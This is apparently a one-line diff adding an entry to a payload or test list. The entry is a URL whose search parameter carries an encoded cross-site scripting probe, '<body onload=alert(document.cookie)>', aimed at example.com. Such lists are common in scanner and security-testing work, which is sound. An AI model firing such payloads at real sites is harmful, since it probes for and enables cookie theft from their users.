@@ -1,0 +1,1 @@
+http://www.example.com/archives.cfm/search/?term=%3Cbody%20onload=alert(document.cookie)%3E
